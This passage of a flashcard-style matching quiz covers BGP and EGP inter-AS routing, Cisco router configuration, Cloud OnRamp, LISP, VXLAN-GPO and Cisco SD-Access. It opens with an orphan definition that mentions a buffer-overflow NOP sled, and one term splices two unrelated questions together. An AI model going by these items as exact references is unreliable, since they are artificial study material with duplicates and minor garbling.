pairs.definition: During the return, the return address is popped from the stack, so %esp advances 4 bytes. The injected code and NOP sled sit below the new return address.

prompt: Match each term to its correct definition.

pairs.term: How does BGP determine the shortest inter-AS path?
pairs.definition: The shortest inter-AS path is the path with the least number of AS numbers in the AS_PATH; e.g., given paths (4,2,1) with four AS hops and (3,1) with three, AS7 chooses (3,1).

pairs.term: How does BGP detect routing loops?
pairs.definition: If a router receives an update containing its local AS number in the AS_PATH, it knows a routing loop has occurred and does not accept the update.

pairs.term: Why does Cisco maintain a separate BGP routing table?
pairs.definition: BGP takes a higher view of the Internet than an IGP - it sees only a tree of autonomous systems and not the details of topologies within each AS - and this view is not compatible with the IGP view, so BGP routes are held in a separate table.

pairs.term: What do the status codes in 'show ip bgp' output mean?
pairs.definition: s = suppressed, d = damped, h = history, * = valid, > = best, i = internal; a '>' following the '*' indicates which path the router is currently using (the best path). Origin codes are i = IGP, e = EGP, ? = incomplete.

pairs.term: How does the BGP table differ from the AS-internal routing table?
pairs.definition: The BGP table lists all known paths to each destination (multiple next hops), whereas the AS-internal routing table lists only the routes currently being used; a '>' marks the best path, which is the one with the shortest AS_PATH.

pairs.term: How do BGP peers initially exchange routing information, and what happens after?
pairs.definition: When two neighbors first establish a BGP peer connection they exchange their entire BGP routing tables; after that they exchange incremental, partial updates - only when something changes, and only about what changed.

prompt: Match each term to its correct definition.

pairs.term: What are the size limits and header of BGP messages?
pairs.definition: BGP messages are carried within TCP segments using port 179; the maximum message size is 4096 octets and the minimum is 19 octets. The common header consists of Marker, Length, and Type fields.

pairs.term: What is the Marker field of the BGP header?
pairs.definition: A 16-octet field used to detect loss of synchronization between BGP peers and to authenticate messages when authentication is supported; if the message type is Open or the Open message contains no authentication information, the Marker is set to all 1s.

pairs.term: What are the BGP type codes?
pairs.definition: 1 = Open, 2 = Update, 3 = Notification, 4 = Keepalive.

pairs.term: What are the four flag bits in the BGP Attribute Type field?
pairs.definition: O (Optional bit: 0 = Optional, 1 = Well-Known), T (Transitive bit: 0 = Transitive, 1 = Nontransitive), P (Partial bit: 0 = partial, 1 = complete for optional transitive attributes), and E (Extended length bit: 0 = one-octet length, 1 = two-octet length).

pairs.term: What are the BGP attribute type codes and their values?
pairs.definition: 1 = ORIGIN (0 IGP, 1 EGP, 2 Incomplete); 2 = AS_PATH (1 AS_SET, 2 AS_SEQUENCE, 3 AS_CONFED_SET, 4 AS_CONFED_SEQUENCE); 3 = NEXT_HOP; 4 = MULTI_EXIT_DISC; 5 = LOCAL_PREF; 6 = ATOMIC_AGGREGATE; 7 = AGGREGATOR; 8 = COMMUNITY; 9 = ORIGINATOR_ID; 10 = CLUSTER_LIST.

pairs.term: What is the BGP Keepalive message?
pairs.definition: It consists of only the 19-octet BGP message header with no additional data; Keepalives are exchanged on a period one-third the hold time (but not less than 1 second), and if the negotiated hold time is 0 Keepalives are not sent.

prompt: Match each term to its correct definition.

pairs.term: What are the four categories of BGP path attributes?
pairs.definition: Well-known mandatory, well-known discretionary, optional transitive, and optional nontransitive.

pairs.term: What is the difference between well-known and optional attributes?
pairs.definition: A well-known attribute must be recognized by all BGP implementations; an optional attribute does not have to be supported. Well-known attributes are mandatory (must be in all Update messages) or discretionary (may or may not be sent).

pairs.term: When is an AS number added to the AS_PATH?
pairs.definition: Only when an Update is sent to a neighbor in another AS - i.e., between EBGP peers. When the route is advertised between IBGP peers (same AS), no AS number is added.

pairs.term: What options does a BGP speaker have for dealing with overlapping routes?
pairs.definition: Advertise both the more-specific and the less-specific route; advertise only the more-specific route; advertise only the nonoverlapping part; aggregate the two routes and advertise the aggregate; advertise only the less-specific route; or advertise neither.

pairs.term: What are AS_SEQUENCE and AS_SET?
pairs.definition: The two types of AS_PATH. AS_SEQUENCE is an ordered list of AS numbers along the path; AS_SET is an unordered list of the AS numbers along a path. They are distinguished in the AS_PATH attribute with a type code.

prompt: Match each term to its correct definition.

pairs.term: What is a Network Access Point (NAP)?
pairs.definition: A LAN or switch - typically Ethernet, FDDI, or ATM - across which different service providers can exchange routes and data traffic; the NSF implemented the first four NAPs in 1994.

pairs.term: What is summarization or route aggregation?
pairs.definition: Advertising a contiguous set of addresses with a single, less-specific address, accomplished by reducing the length of the subnet mask until it masks only the bits common to all the addresses being summarized.

pairs.term: What is a peering agreement, and what are the two types?
pairs.definition: An agreement between two or more service providers to share routes across a NAP; a bilateral peering agreement is between two providers directly, and a multilateral peering agreement (MLPA) is between a group of similar-sized providers.

pairs.term: Give an example of route aggregation from the chapter.
How many equivalent Class C addresses and hosts are in a /19 CIDR block?
pairs.definition: A /19 block is equivalent to 32 Class C addresses and provides 8190 possible host addresses; /19 is the commonly accepted 'globally routable' prefix size.

pairs.term: What is the key characteristic of a summary address?
pairs.definition: Its mask is shorter than the masks of the addresses it is summarizing; the ultimate summary address is the default address 0.0.0.0/0, commonly written as 0/0.

prompt: Match each term to its correct definition.

pairs.term: router rip / redistribute connected / redistribute egp 65501 metric 5 / network 172.16.0.0
pairs.definition: The stub gateway's IGP (RIP) configuration in the case study: redistributes connected networks and EGP-learned routes (metric 5) into the local AS so interior routers learn the exterior networks.

pairs.term: router egp 0 / network 192.168.16.0 / neighbor any 10 / access-list 10 deny 172.20.1.2 / access-list 10 permit any
pairs.definition: Core gateway configuration that regulates peering: 'neighbor any 10' uses access list 10 to deny peering with Alfalfa (172.20.1.2) while permitting all other neighbors.

pairs.term: In the indirect-neighbors case study, what routing result did advertising Groucho and Harpo as third-party neighbors produce?
pairs.definition: Harpo's routing table pointed directly to Groucho (192.168.19.2) as the next hop to network 192.168.20.0 in AS 65503 instead of routing through the core gateway Ollie (192.168.19.1).

pairs.term: When a default route is advertised into an AS, what does the receiving gateway's routing table show?
pairs.definition: A gateway of last resort entry, and an EGP default route entry such as 'E* 0.0.0.0 0.0.0.0 [140/4] via <neighbor>', through which all exterior networks are reached.

pairs.term: In the EGP stub gateway case study, why is it necessary to advertise directly connected network 192.168.16.0 into the local AS's RIP?
pairs.definition: Split horizon prevents the interior neighbor (Stan) from advertising the network back to the stub (Buster) via EGP, so redistribution of connected networks (or a 'network 192.168.16.0' plus 'passive-interface' statement) is needed so the core learns of it.

pairs.term: In the core gateway case study, why does Stan (in AS 65501, lower AS) appear as active for all its peer relationships?
pairs.definition: Cisco's EGP implementation makes the neighbor whose AS number is lower the active neighbor; AS 65501 is lower than the other AS numbers, so Stan is active and the peers such as Ollie show as passive.

prompt: Match each term to its correct definition.

pairs.term: What is the difference between the 'network' statement under an IGP and under EGP?
pairs.definition: Under an IGP, 'network' instructs the router to enable the protocol on interfaces in that network; under an inter-AS protocol like EGP, 'network' tells the protocol what network addresses to advertise.

pairs.term: What are the optional 'internal' and 'external' keywords on the EGP 'third-party' neighbor statements?
pairs.definition: They classify the indirect neighbor as an interior gateway (internal) or an exterior gateway (external) when the router advertises the third-party neighbor in its Updates.

pairs.term: Why can the 'network' statement under EGP specify only major networks?
pairs.definition: Because EGP is purely classful - the Update carries only the major class portion of an address (first octet of Class A, first two of Class B, first three of Class C) - so individual subnets cannot be kept private.

pairs.term: In the indirect-neighbors configuration, why does Chico fall under the 'neighbor any' statement?
pairs.definition: Chico is not on the shared Ethernet with Groucho and Harpo, so it cannot be an indirect (third-party) neighbor; only Groucho and Harpo, which share a common Ethernet, are configured as third-party neighbors of each other.

pairs.term: Why is mutual redistribution between EGP and an IGP hazardous, and how is it mitigated?
pairs.definition: Route feedback can occur, especially with topological loops or multiple redistribution points; route filters should always be used to ensure no interior network addresses are accepted from the exterior gateway and no exterior addresses are advertised to it.

pairs.term: What is the advantage of using the 'network' statement under EGP rather than redistribution?
pairs.definition: It is somewhat akin to using static routes rather than a dynamic routing protocol: both allow precise control over network reachability, avoiding the route-feedback hazards of mutual redistribution.

prompt: Match each term to its correct definition.

pairs.term: What is the EGP Version field value for all current implementations, and what happens on a mismatch?
pairs.definition: 2. If a received message's version does not agree with the receiver's version number, the message is rejected.

pairs.term: What are the Status numbers used with message type 3 (Neighbor Acquisition)?
pairs.definition: 0 Unspecified, 1 Active mode, 2 Passive mode, 3 Insufficient resources, 4 Administratively prohibited, 5 Going down, 6 Perimeter problem, 7 Protocol violation.

pairs.term: What is the 'Status' field used for in a Neighbor Acquisition message?
pairs.definition: It indicates the acquisition state or condition, such as whether the neighbor is in Active mode or Passive mode (e.g., Status=1 ACTIVE-MODE, Status=2 PASSIVE-MODE).

pairs.term: What codes are used with EGP message type 5 (Neighbor Reachability)?
pairs.definition: 0 = Hello, 1 = I-Heard-You; the message carries no additional fields beyond the header.

pairs.term: What is the purpose of the EGP 'Reserved' fields in the Poll and Error messages?
pairs.definition: They are unused reserved bits; RFC 888 shows the Status field as unused in the Poll and Error messages, while RFC 904 specifies the status uses shown for the Error message.

pairs.term: What Status numbers are used with message types 5 and 2 (Neighbor Reachability and Poll)?
pairs.definition: 0 = Indeterminate, 1 = Up state, 2 = Down state.

prompt: Match each term to its correct definition.

pairs.term: How many message types does EGP define in total, and what are the ten?
pairs.definition: Ten: Neighbor Acquisition Request, Confirm, Refuse, Cease, Cease Acknowledgment (all type 3), Hello and I-Heard-You (type 5), Poll (type 2), Update (type 1), and Error (type 8).

pairs.term: Why do EGP neighbors not need to share a common data link?
pairs.definition: EGP messages are unicast to configured neighbors and can cross router boundaries; RFC 888 suggests a low TTL but nothing in EGP requires a shared link, so Cisco sets the TTL to 255.

pairs.term: Why is EGP topology comparable to OSPF's two-level topology requirement?
pairs.definition: Requiring all EGP reachability information between stub autonomous systems to traverse the core AS reduces the potential for routing loops, just as requiring interarea OSPF traffic to traverse the backbone reduces loops.

pairs.term: What is the 'Hello interval' vs the 'Poll interval' in EGP neighbor acquisition?
pairs.definition: The Hello interval is the minimum interval between Hello messages the gateway is willing to accept; the Poll interval is the minimum interval the gateway is willing to be polled for routing updates.

pairs.term: What is the first IGP, historically, and what was its metric?
pairs.definition: GGP (Gateway-to-Gateway Protocol), the routing protocol of the ARPANET, became by default the first IGP, with distances measured in gateway hops.

pairs.term: Why might a core gateway be the active neighbor of one adjacency and the passive neighbor of another?
pairs.definition: A core gateway can peer with routers in several autonomous systems; Cisco's implementation makes the neighbor with the lower AS number the active neighbor, so the role can differ per adjacency.

prompt: Match each term to its correct definition.

pairs.term: What routing protocol did the ARPANET gateways run in the early 1980s, and what was its metric?
pairs.definition: The Gateway-to-Gateway Protocol (GGP), a distance vector protocol; every gateway knew a route to every reachable network at a distance measured in gateway hops.

pairs.term: What solution did RFC 827 propose for the ARPANET's scalability problems?
pairs.definition: Migrate the ARPANET from a single internetwork to a system of interconnected, autonomously controlled internetworks called autonomous systems (ASs), adding a new layer of hierarchy.

pairs.term: How is an autonomous system number structured and assigned?
pairs.definition: An AS number is a 16-bit number assigned by the same addressing authority that assigns IP addresses.

pairs.term: What AS numbers are reserved for private use?
pairs.definition: AS numbers 64512 to 65535 are reserved for private use (per RFC 1930).

pairs.term: Why is EGP described as NOT a routing protocol despite being a distance vector protocol?
pairs.definition: EGP has no algorithm for choosing an optimal path between networks and no loop-prevention mechanism; it is only a common language for exchanging reachability information (a list of major network addresses and the gateways by which they can be reached).

prompt: Match each term to its correct definition.

pairs.term: Why did NSFnet make EGP's limitations more pronounced?
pairs.definition: There were now multiple backbones and acceptable use policies dictating what traffic could traverse which backbone, and EGP cannot support sophisticated policy-based routing.

pairs.term: What problems arise from EGP's inability to interact with IGPs?
pairs.definition: EGP distances do not reliably translate into RIP hop counts; if the EGP distance causes the hop count to exceed 15, RIP declares the network unreachable.

pairs.term: List the other shortcomings of EGP.
pairs.definition: Susceptibility to failures when conveying information about a large number of networks, vulnerability to intentionally or unintentionally inaccurate network information, and extremely slow advertisement of network changes.

pairs.term: What happened to EGP in the end, and what is its legacy?
pairs.definition: Attempts to create an EGPv3 failed and EGP was abandoned in favor of BGP; EGP became both the name of a protocol and of a class of protocols, and its legacy lives on in the form of autonomous systems and inter-AS routing.

pairs.term: What is 'counting to infinity' in EGP and why is it useless?
pairs.definition: The only loop-detection mechanism EGP has is counting to the 255-distance boundary, but with the default 180-second Poll interval it would take EGP peers almost 13 hours to count to infinity, making it ineffective.

pairs.term: What was the intended use of EGP in 1983?
pairs.definition: EGP was intended merely to connect stub gateways to the ARPANET backbone, a limited topology, but its creators foresaw that such a topology would soon be inadequate as the Internet evolved into a less structured mesh.

prompt: Match each term to its correct definition.

pairs.term: How long does EGP take to declare a route down, and why?
pairs.definition: 18 minutes: EGP will not declare a route down until it has failed to receive six consecutive updates, coupled with a 180-second update interval.

pairs.term: How do you determine whether a neighbor is an interior or exterior neighbor from 'show ip egp'?
pairs.definition: Compare the FAS/LAS columns: if FAS equals LAS, the neighbor is interior to the local AS; if they differ, the neighbor is exterior.

pairs.term: How long can it take for a network change to propagate through an EGP internetwork?
pairs.definition: 54 minutes can pass between the time the exterior gateway of a downstream AS declares a network down and the time a gateway four hops away declares the network down.

pairs.term: What should you remember about EGP neighbor statements when examining a configuration?
pairs.definition: The gateway must have some sort of neighbor statement - either explicit or 'neighbor any' - for every neighbor, and understanding the 'network' statement (and how it differs from IGPs) is important.

pairs.term: show ip egp
pairs.definition: Displays information about EGP connections and neighbors: FAS/LAS, neighbor state and uptime, send/receive sequence numbers, Hello and Poll intervals, j/k thresholds, and permanent/temporary and active/passive flags.

pairs.term: How long does EGP take to declare a route down, and what interval governs it?
pairs.definition: 18 minutes: EGP will not declare a route down until it has failed to receive six consecutive updates for the route, and with a 180-second update interval that takes 6 x 180 seconds = 18 minutes.

prompt: Match each term to its correct definition.

pairs.term: What is the difference between a route reflector and a route server?
pairs.definition: Their primary purpose is the same - reducing the number of required peering sessions by providing a single peering point - but route reflectors are also routers, whereas route servers are not.

pairs.term: What is a cluster ID?
pairs.definition: A unique 4-octet identifier for each cluster within an AS; if the cluster has a single route reffector, the cluster ID is the RR's router ID; if the cluster has multiple RRs, each RR must be manually configured with a cluster ID.

pairs.term: What AS number range is commonly used for member autonomous systems of a confederation?
pairs.definition: The reserved range 64512 to 65535 is commonly used to number the member autonomous systems within a confederation.

pairs.term: What four tools does BGP provide to simplify management of large-scale peering?
pairs.definition: Peer groups and communities (which simplify management of routing policies between multiple peers, internal or external), and route reflectors and confederations (which simplify management of IBGP among large numbers of peers).

prompt: Match each term to its correct definition.

pairs.term: How do EGP neighbors establish compatibility before exchanging reachability information?
pairs.definition: A simple two-way handshake: one neighbor sends a Neighbor Acquisition Request and the other responds with a Neighbor Acquisition Confirm message.

pairs.term: What is the Hello interval in EGP?
pairs.definition: The minimum interval, in seconds, between Hello messages that a gateway is willing to accept from a neighbor; the Cisco default is 60 seconds.

pairs.term: What is the Poll interval in EGP?
pairs.definition: The minimum interval, in seconds, that a gateway is willing to be polled by the neighbor for routing updates; the Cisco default is 180 seconds (3 minutes).

pairs.term: What are the EGP neighbor states through which a newly learned neighbor passes?
pairs.definition: Idle, then Acquire when the first Acquisition Request is sent, then Down when the Acquisition Confirm is received; after Hello exchanges the state becomes Up.

pairs.term: What is the purpose of the sequence number in EGP messages?
pairs.definition: It allows EGP message pairs (such as Request/Confirm, Request/Refusal, and Cease/Cease-Ack pairs) to be identified and synchronized.

pairs.term: How does Cisco's EGP implementation determine which neighbor is active?
pairs.definition: It uses the AS numbers as the determining factor: the neighbor whose AS number is lower will be the active neighbor.

prompt: Match each term to its correct definition.

pairs.term: What is a route server in the context of EGP?
pairs.definition: An EGP Update originator that includes indirect neighbors only - it has learned reachability information from an IGP or static routes and advertises it to EGP neighbors without performing any packet-forwarding functions itself.

pairs.term: What is the size and range of the EGP distance field?
pairs.definition: The distance field is 8 bits, so the distance can range from 0 to 255; RFC 904 does not specify how the distance is interpreted, only that 255 indicates unreachable networks. Cisco interprets distance as hops.

pairs.term: What are the default EGP distance-advertising rules?
pairs.definition: A gateway advertises all networks within its own AS with a distance of 0, all networks within another AS with a distance of 3, and indicates a network became unreachable with a distance of 255.

pairs.term: Why is the EGP distance virtually useless for path selection?
pairs.definition: The distances do not reliably reflect the actual number of hops (e.g., a network one hop away in another AS is advertised with distance 3), so EGP distances cannot be used to determine the best path to a network.

pairs.term: What administrative distance does Cisco assign to EGP routes in the routing table?
pairs.definition: 140, which is higher than any IGP (except external EIGRP), so a router always prefers an IGP route over an EGP advertisement of the same network.

pairs.term: How does Cisco's EGP process treat received distances?
pairs.definition: It increments the distance by one when installing the route, just as a RIP routing algorithm does.

prompt: Match each term to its correct definition.

pairs.term: In a multihomed-to-multiple-providers design, what is the best strategy for incoming traffic?
pairs.definition: Advertise all internal routes to both providers so all destinations within the AS are completely reachable via either ISP; BGP provides tools to communicate preferences so incoming traffic can prefer one path over another.

pairs.term: In the example where ISP1 is preferred and ISP2 is used only for its customers and backup, what routes does the subscriber take from each?
pairs.definition: Full routes from ISP1, and from ISP2 only its customer routes plus a default route to be used if the connection to the primary ISP fails; the same routes received from ISP2 are normally preferred through the shorter path via ISP2.

pairs.term: default-information originate metric 10
pairs.definition: OSPF configuration on the primary border router in the multihoming case study: advertises a default route into the OSPF domain with metric 10 (the backup router uses metric 100).

pairs.term: default-information originate metric 10 metric-type 1
pairs.definition: OSPF configuration for load sharing when multihomed to the same AS: advertises default routes with equal metrics and OSPF metric type E1 so every router chooses the closest exit point.

pairs.term: router ospf 100 / network 205.110.32.0 0.0.15.255 area 0
pairs.definition: The OSPF configuration in the multihoming case studies: enables OSPF process 100 in area 0 on interfaces in network 205.110.32.0, into which the default route is originated.

pairs.term: What are partial BGP routes?
pairs.definition: A compromise between full routes and accepting no routes: some subset of the full Internet routing table, e.g., a provider might advertise only routes to its other subscribers plus a default route to reach the rest of the Internet.

prompt: Match each term to its correct definition.

pairs.term: What is Cloud OnRamp (CoR)?
pairs.definition: A set of SD-WAN functionalities addressing optimal cloud SaaS application access and IaaS connectivity, delivering the best QoE for SaaS by continuously monitoring SaaS performance and selecting the best-performing path based on jitter, loss, and delay.

pairs.term: How does CoR for SaaS measure performance?
pairs.definition: The edge device at the remote site sends small HTTP probes to the SaaS application through the Internet circuits to measure latency and loss. BFD is not used because there is no SD-WAN edge device on the SaaS side to form a BFD session with.

pairs.term: What is a CoR DIA site?
pairs.definition: A remote site that plans on forwarding SaaS traffic directly to the Internet out of its Internet circuits (direct Internet access).

pairs.term: What is the vQoE score?
pairs.definition: The Viptela Quality of Experience score quantifying cloud SaaS application connection quality on a scale of 0 to 10 (0 worst, 10 best), observable in the vManage GUI; the edge uses the circuit with the highest QoE score for an application.

pairs.term: What is a CoR SaaS gateway node?
pairs.definition: A regional hub edge device enabled with CoR for SaaS that reports its HTTP connection loss and latency to remote site edges in an OMP message exchange through the vSmart controllers.

pairs.term: What are CoR SaaS client sites?
pairs.definition: Sites using solely private transports (such as two MPLS providers) that identify which path between two different gateways is best for a specific application based on the QoE score and forward traffic to the appropriate gateway site.

prompt: Match each term to its correct definition.

pairs.term: What is LISP and what does it do?
pairs.definition: The Locator/ID Separation Protocol, an IETF standard defined in RFC 6830, based on a simple endpoint identifier (EID) to routing locator (RLOC) mapping system that separates the identity (endpoint IP) from its current location (edge/border router IP).

pairs.term: What is a LISP map server (MS)?
pairs.definition: A centralized mapping database (a control plane node in SD-Access) that stores remote destination information so each router manages only its local routes and queries the map system to locate destination EIDs.

pairs.term: What advantages does LISP provide for SD-Access?
pairs.definition: Smaller routing tables, dynamic host mobility for wired and wireless endpoints, address-agnostic mapping (IPv4, IPv6, and/or MAC), and built-in network segmentation through VRF instances.

pairs.term: What SD-Access enhancements have been added to the original LISP specifications?
pairs.definition: Distributed Anycast Gateway, VN Extranet, and Fabric Wireless.

prompt: Match each term to its correct definition.

pairs.term: What are the three main controller layer subsystems?
pairs.definition: Cisco Network Control Platform (NCP), Cisco Network Data Platform (NDP), and Cisco Identity Services Engine (ISE).

pairs.term: What does the Cisco Network Control Platform (NCP) do?
pairs.definition: A subsystem integrated into DNA Center that provides all underlay and fabric automation and orchestration services, configuring devices via NETCONF/YANG, SNMP, SSH/Telnet, and providing automation status to the management layer.

pairs.term: What does the Cisco Network Data Platform (NDP) do?
pairs.definition: A data collection, analytics, and assurance subsystem integrated into DNA Center that analyzes and correlates network events from sources such as NetFlow and SPAN, identifies historical trends, and provides contextual information to NCP and ISE.

pairs.term: What is the role of Cisco ISE in the controller layer?
pairs.definition: To provide identity and policy services, network access control (using 802.1x, MAB, and WebAuth), and to place profiled endpoints into the correct scalable group and host pool, plus program group-based policies on network devices.

prompt: Match each term to its correct definition.

pairs.term: What tunneling technology is used for the SD-Access fabric data plane and why?
pairs.definition: VXLAN, because it is IP/UDP based (forwardable by any IP-based network) and is capable of encapsulating the original Ethernet header to perform MAC-in-IP encapsulation, which LISP does not do.

pairs.term: What does VXLAN encapsulation support in SD-Access?
pairs.definition: Layer 2 and Layer 3 virtual topologies (overlays), operation over any IP-based network, built-in network segmentation (VRF instance/VN), and built-in group-based policy.

pairs.term: What is VXLAN Group Policy Option (VXLAN-GPO)?
pairs.definition: An enhanced VXLAN format that added new fields to the first 4 bytes of the VXLAN header to carry up to 64,000 SGT tags; defined in IETF draft draft-smith-vxlan-group-policy-05.

pairs.term: What are the new fields in the VXLAN-GPO packet format?
pairs.definition: Group Policy ID (16-bit carrying the SGT tag), Group Based Policy Extension Bit (G bit), Don't Learn Bit (D bit), and Policy Applied Bit (A bit).

pairs.term: What does the Group Based Policy Extension Bit (G bit) indicate?
pairs.definition: When set to 1, an SGT tag is being carried within the Group Policy ID field; when 0, it is not.

pairs.term: What does the Don't Learn Bit (D bit) in VXLAN-GPO indicate?
pairs.definition: When set to 1, the egress virtual tunnel endpoint (VTEP) must not learn the source address of the encapsulated frame.

prompt: Match each term to its correct definition.

pairs.term: What is a virtual network (VN) in SD-Access?
pairs.definition: Virtualization at the device level using VRF instances to create multiple Layer 3 routing tables, providing segmentation across IP addresses. LISP instance IDs maintain separate VRFs in the control plane, and edge nodes add a VXLAN VNID in the data plane.

pairs.term: What is a host pool?
pairs.definition: A group of endpoints assigned to an IP pool subnet in the SD-Access fabric. Fabric edge nodes have an SVI for each host pool used as the default gateway, and EID mappings advertise each host pool per instance ID.

pairs.term: What is a scalable group?
pairs.definition: A group of endpoints with similar policies, assigned using TrustSec SGT tags, either statically per fabric edge port or dynamically via AAA/RADIUS using Cisco ISE. There is a one-to-one relationship between host pools and scalable groups.

pairs.term: What is the anycast gateway concept in SD-Access?
pairs.definition: A pervasive Layer 3 default gateway where the same SVI is provisioned on every edge node with the same SVI IP and MAC address, allowing a subnet to be stretched across the fabric so endpoints can move without changing IP or gateway.

pairs.term: What is the relationship between host pools and scalable groups in SD-Access?
pairs.definition: There is a direct one-to-one relationship between host pools and scalable groups, and scalable groups operate within a VN by default; the fabric edge and border nodes include the SGT tag ID in each VXLAN header to keep each scalable group separate.

pairs.term: How can an endpoint be assigned to a scalable group?
pairs.definition: Statically per fabric edge port or dynamically through AAA or RADIUS using Cisco ISE; the same scalable group is configured on all fabric edge and border nodes and is advertised through Cisco TrustSec.

prompt: Match each term to its correct definition.

pairs.term: What does a control plane node do in SD-Access?
pairs.definition: It contains the settings, protocols, and mapping tables to provide the endpoint-to-location (EID-to-RLOC) mapping system for the fabric overlay; it is a LISP map server/resolver (MS/MR) with enhanced functions such as fabric wireless and SGT mapping.

pairs.term: What does a fabric border node do?
pairs.definition: It is a LISP proxy tunnel router (PxTR) that connects external Layer 3 networks to the SD-Access fabric and translates reachability and policy information (VRF and SGT) between domains.

pairs.term: What are the three types of fabric border nodes?
pairs.definition: Internal border (connects only to known areas such as WLC, firewall, data center), default border (connects only to unknown external areas such as the Internet or public cloud via a default route), and internal + default border (combines both functions).

pairs.term: What does a fabric edge node do?
pairs.definition: It is a LISP tunnel router (xTR) that connects wired endpoints to the fabric and provides the anycast gateway, endpoint authentication, assignment to overlay host pools, and group-based policy enforcement.

pairs.term: What is an anycast gateway at the fabric edge?
pairs.definition: A single Layer 3 default gateway where the same SVI with the same IP address is provisioned on all fabric edge nodes, and the edge performs encapsulation/de-encapsulation of host traffic.

pairs.term: What does a fabric WLC do?
pairs.definition: It connects APs and wireless endpoints to the SD-Access fabric, provides onboarding and mobility services for wireless users, and performs PxTR registrations to the fabric control plane on behalf of the fabric edges.

prompt: Match each term to its correct definition.

pairs.term: What is the management layer of SD-Access?
pairs.definition: The Cisco DNA Center user interface/user experience layer, presenting information from all other layers as a centralized management dashboard; it is the intent-based networking aspect of Cisco DNA.

pairs.term: What are the four primary Cisco DNA Center workflows?
pairs.definition: Design, policy, provision, and assurance.

pairs.term: What tools are in the Cisco DNA design workflow?
pairs.definition: Network Hierarchy (geolocation, building, floorplan, site ID), Network Settings (DNS, DHCP, AAA, credentials), Image Repository (software images/updates), and Network Profiles (LAN, WAN, WLAN connection profiles).

pairs.term: What tools are in the Cisco DNA policy workflow?
pairs.definition: Dashboard, Group-Based Access Control (SGACLs via ISE integration), IP-Based Access Control, Application (QoS), Traffic Copy (ERSPAN), and Virtual Network (VNs and scalable groups).

pairs.term: What tools are in the Cisco DNA provision workflow?
pairs.definition: Devices (assign to site, software version, underlay), Fabrics (fabric domains), Fabric Devices (device roles such as control plane, border, edge, WLC), and Host Onboarding (host authentication type and host pools per VN).

pairs.term: What tools are in the Cisco DNA assurance workflow?
pairs.definition: Dashboard (global health scores), Client 360 (client-specific status), Devices 360 (device-specific status), and Issues (reactive and proactive issue monitoring).

pairs.term: What capabilities and features does SD-Access leverage?
pairs.definition: Network automation (via DNA Center), network assurance and analytics, host mobility, identity services (ISE), policy enforcement (SGACLs), secure segmentation, and network virtualization (VRF/VNs).

pairs.term: Why are group-based policies using SGACLs preferred over traditional ACLs?
pairs.definition: Traditional ACLs rely on IP addresses and subnets, making them difficult to deploy, maintain, and scale; SGACLs provide simpler, more scalable policy enforcement based on identity instead of IP address.

pairs.term: What are the four basic layers of the Cisco SD-Access architecture?
pairs.definition: Physical layer, network layer, controller layer, and management layer.

pairs.term: What does network assurance and analytics provide in SD-Access?
pairs.definition: Proactive prediction of network-related and security-related risks by using telemetry to improve the performance of the network, endpoints, and applications, including encrypted traffic.

pairs.term: Which infrastructure does secure segmentation in SD-Access support?
pairs.definition: With SD-Access it is easier to segment the network to support guest, corporate, facilities, and IoT-enabled infrastructure.

pairs.term: What are the two main components of SD-Access?
pairs.definition: The Cisco Campus Fabric solution and Cisco DNA Center.

pairs.term: What does the network layer of SD-Access consist of?
pairs.definition: The underlay network (physical transport) and the overlay network (virtual tunneled network) that work together to deliver data packets between network devices.

pairs.term: What is the sole purpose of the network underlay?
pairs.definition: To transport data packets between network devices for the SD-Access fabric overlay.

pairs.term: What is the overlay network?
pairs.definition: A virtual (tunneled) network that virtually interconnects all network devices, forming a fabric of interconnected nodes and abstracting the complexities and limitations of the underlay network.

pairs.term: What devices make up the physical layer of SD-Access?
pairs.definition: Cisco switches (wired LAN access), Cisco routers (WAN and branch access), Cisco wireless (WLCs and APs for WLAN access), and Cisco controller appliances (Cisco DNA Center and Cisco ISE).

pairs.term: What are SD-Access extension nodes?
pairs.definition: Cisco access layer switches that do not actively participate in the SD-Access fabric but are part of it because of automation.
